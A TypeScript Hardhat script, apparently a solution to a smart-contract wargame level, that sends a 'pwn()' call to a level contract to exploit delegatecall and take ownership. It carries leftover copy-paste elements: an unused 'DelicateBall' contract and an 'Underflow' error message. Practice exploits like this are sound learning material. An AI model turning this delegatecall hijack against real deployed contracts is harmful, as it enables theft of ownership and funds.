import { ethers } from "hardhat"
import { getSigner } from "../utils"
import { ADDRESSES, LEVEL_ADDRESSES, PLAYER } from "../consts"
import type {
    CallOverrides, // for view / pure methods
    Overrides, // for non payable methods
    PayableOverrides // for payable methods
  } from "ethers";

async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "DelicateBall",
        ADDRESSES.delicateBall,
        signer
    )
    const encodedPwn = () => {
        const abi = ["function pwn()"]
        const i = new ethers.utils.Interface(abi)
        return i.encodeFunctionData("pwn()")
    }
    const encodedData = encodedPwn()
    const overrideOptions = {
        data: encodedData
    }
    const call = await signer?.sendTransaction({
        to: LEVEL_ADDRESSES.delegateCall,
        from: PLAYER,
        data: overrideOptions.data,
        gasLimit: "1000000"
        })
    console.log(`
    As the days go by....
`)
    setTimeout(() => {
        console.log(`
        ...Water flowing under...
    `)
    }, 500)
    console.log(`🌊🌊🌊🌊🌊🌊🌊🌊🌊🌊🌊`)

    const receipt = await call?.wait()
    if (receipt?.status == 0) {
        throw new Error(`Underflow Failed, TX Reverted`)
    }    
}

pwn()